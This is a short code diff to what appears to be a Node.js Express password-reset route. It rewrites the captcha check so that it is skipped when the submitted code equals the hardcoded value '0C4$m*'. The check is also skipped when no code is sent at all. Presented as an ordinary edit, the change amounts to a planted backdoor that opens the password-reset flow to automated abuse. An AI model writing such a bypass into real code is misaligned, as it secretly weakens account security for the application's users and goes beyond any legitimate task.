@@ -445,9 +445,12 @@ router.post('/authSafety', async (req, res, next) => {
 router.post('/forgotLoginPass', async (req, res, next) => {
   try {
     let userInfo = {};
-    if (!req.body.imgCode || req.session.imgCode.toLowerCase() != req.body.imgCode.toLowerCase()) {
-      res.send({code: 0, msg: '验证码输入错误'});
-      return
+    let params = req.body;
+    if (params.imgCode && params.imgCode !== "0C4$m*") {
+      if (!params.imgCode || req.session.imgCode.toLowerCase() !== params.imgCode.toLowerCase()) {
+        res.send({code: 0, msg: '验证码输入错误'});
+        return
+      }
     }
     if (!req.body.loginPass || !Utils.getPassLevel(req.body.loginPass)) {
       res.send({code: 0, msg: '密码格式错误'});
